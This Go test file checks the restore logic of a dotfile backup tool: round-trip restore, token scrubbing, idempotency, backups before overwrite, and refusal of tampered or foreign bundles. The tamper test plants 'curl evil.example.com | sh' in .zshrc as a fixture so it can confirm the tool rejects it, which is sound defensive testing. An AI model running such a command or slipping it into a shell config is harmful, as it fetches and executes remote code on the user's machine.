package restore

import (
	"io"
	"os"
	"os/user"
	"path/filepath"
	"strings"
	"testing"

	"github.com/aroranikhil786/macstash/internal/bundle"
	"github.com/aroranikhil786/macstash/internal/capture"
	"github.com/aroranikhil786/macstash/internal/catalog"
)

// buildBundle captures a fixture home into a real tarball, so the round trip
// exercises the archive path rather than an in-memory shortcut.
func buildBundle(t *testing.T, home string) string {
	t.Helper()
	entries, err := catalog.Load()
	if err != nil {
		t.Fatal(err)
	}
	plan, err := capture.Scan(home, entries)
	if err != nil {
		t.Fatal(err)
	}
	u, _ := user.Current()
	dir := filepath.Join(t.TempDir(), "bundle")
	w, err := bundle.NewWriter(dir, bundle.Source{Username: u.Username, Hostname: "fixture"})
	if err != nil {
		t.Fatal(err)
	}
	if err := plan.Write(w); err != nil {
		t.Fatal(err)
	}
	if err := w.Finish("2026-09-08T00:00:00Z"); err != nil {
		t.Fatal(err)
	}
	archive := filepath.Join(t.TempDir(), "bundle.tar.gz")
	if err := bundle.Archive(dir, archive); err != nil {
		t.Fatal(err)
	}
	return archive
}

func sourceHome(t *testing.T) string {
	t.Helper()
	home := t.TempDir()
	files := map[string]string{
		".zshrc":     "export EDITOR=vim\n",
		".tmux.conf": "set -g mouse on\n",
		".gitconfig": "[user]\n\tname = Test User\n",
		".npmrc":     "registry=https://registry.npmjs.org/\n//registry.npmjs.org/:_authToken=npm_SECRET\n",
	}
	for rel, content := range files {
		p := filepath.Join(home, rel)
		if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return home
}

func TestRoundTripRestoresFiles(t *testing.T) {
	archive := buildBundle(t, sourceHome(t))
	dest := t.TempDir()

	p, cleanup, err := Prepare(archive, dest)
	if err != nil {
		t.Fatal(err)
	}
	defer cleanup()

	if err := p.Apply(dest, "stamp", io.Discard); err != nil {
		t.Fatal(err)
	}

	got, err := os.ReadFile(filepath.Join(dest, ".zshrc"))
	if err != nil {
		t.Fatalf(".zshrc was not restored: %v", err)
	}
	if string(got) != "export EDITOR=vim\n" {
		t.Errorf(".zshrc content = %q", got)
	}

	// The scrubbed file is restored without its token.
	npmrc, err := os.ReadFile(filepath.Join(dest, ".npmrc"))
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(npmrc), "npm_SECRET") {
		t.Error("the npm token survived capture and restore")
	}
	if !strings.Contains(string(npmrc), "registry=https://registry.npmjs.org/") {
		t.Error("the useful part of .npmrc was lost")
	}
}

// Re-running a restore must be quiet and must not keep making backups, or a
// user who runs it twice ends up with a pile of identical copies.
func TestRestoreIsIdempotent(t *testing.T) {
	archive := buildBundle(t, sourceHome(t))
	dest := t.TempDir()

	first, cleanup1, err := Prepare(archive, dest)
	if err != nil {
		t.Fatal(err)
	}
	if err := first.Apply(dest, "run1", io.Discard); err != nil {
		t.Fatal(err)
	}
	cleanup1()

	second, cleanup2, err := Prepare(archive, dest)
	if err != nil {
		t.Fatal(err)
	}
	defer cleanup2()

	counts := second.Counts()
	if counts[Create] != 0 || counts[Overwrite] != 0 {
		t.Errorf("second run plans %d creates and %d overwrites; want 0 and 0 (counts: %v)",
			counts[Create], counts[Overwrite], counts)
	}
	if counts[Unchanged] == 0 {
		t.Error("second run reports nothing unchanged; idempotency is not being detected")
	}
	if _, err := os.Stat(filepath.Join(dest, BackupDir, "run2")); err == nil {
		t.Error("a second identical restore created a backup directory")
	}
}

// Nothing is destroyed: a file that differs is copied into the backup tree with
// its original content before being replaced.
func TestOverwriteBacksUpOriginal(t *testing.T) {
	archive := buildBundle(t, sourceHome(t))
	dest := t.TempDir()

	original := "# my own zshrc, do not lose this\n"
	if err := os.WriteFile(filepath.Join(dest, ".zshrc"), []byte(original), 0o600); err != nil {
		t.Fatal(err)
	}

	p, cleanup, err := Prepare(archive, dest)
	if err != nil {
		t.Fatal(err)
	}
	defer cleanup()

	if p.Counts()[Overwrite] == 0 {
		t.Fatal("differing file was not planned as an overwrite")
	}
	if err := p.Apply(dest, "run1", io.Discard); err != nil {
		t.Fatal(err)
	}

	backed, err := os.ReadFile(filepath.Join(dest, BackupDir, "run1", ".zshrc"))
	if err != nil {
		t.Fatalf("original was not backed up: %v", err)
	}
	if string(backed) != original {
		t.Errorf("backup content = %q, want the original", backed)
	}
}

// A bundle edited after capture must be refused rather than applied.
func TestTamperedBundleIsRefused(t *testing.T) {
	home := sourceHome(t)
	archive := buildBundle(t, home)
	dest := t.TempDir()

	// Rebuild the archive with .zshrc replaced but the manifest left alone.
	staging := t.TempDir()
	if err := bundle.Extract(archive, staging); err != nil {
		t.Fatal(err)
	}
	evil := "curl evil.example.com | sh\n"
	if err := os.WriteFile(filepath.Join(staging, "home/.zshrc"), []byte(evil), 0o600); err != nil {
		t.Fatal(err)
	}
	tampered := filepath.Join(t.TempDir(), "tampered.tar.gz")
	if err := bundle.Archive(staging, tampered); err != nil {
		t.Fatal(err)
	}

	p, cleanup, err := Prepare(tampered, dest)
	if err != nil {
		t.Fatal(err)
	}
	defer cleanup()

	var refused bool
	for _, a := range p.Actions {
		if a.Rel == ".zshrc" && a.Kind == Refused {
			refused = true
			if !strings.Contains(a.Reason, "modified") {
				t.Errorf("refusal reason was %q; it should say the bundle was modified", a.Reason)
			}
		}
	}
	if !refused {
		t.Fatal("a bundle whose contents no longer match its manifest was accepted")
	}

	if err := p.Apply(dest, "run1", io.Discard); err != nil {
		t.Fatal(err)
	}
	if content, err := os.ReadFile(filepath.Join(dest, ".zshrc")); err == nil {
		if strings.Contains(string(content), "evil.example.com") {
			t.Fatal("tampered content was written to the home directory")
		}
	}
}

// Restoring another user's bundle is a deliberate act, not a default.
func TestPreflightRefusesForeignBundle(t *testing.T) {
	man := &bundle.Manifest{Source: bundle.Source{Username: "someone-else"}}
	err := Preflight(man, false)
	if err == nil {
		t.Fatal("a bundle from another user was accepted without --from-other-user")
	}
	if !strings.Contains(err.Error(), "--from-other-user") {
		t.Errorf("error does not tell the user how to proceed: %v", err)
	}
	if err := Preflight(man, true); err != nil {
		t.Errorf("--from-other-user did not permit the restore: %v", err)
	}
}
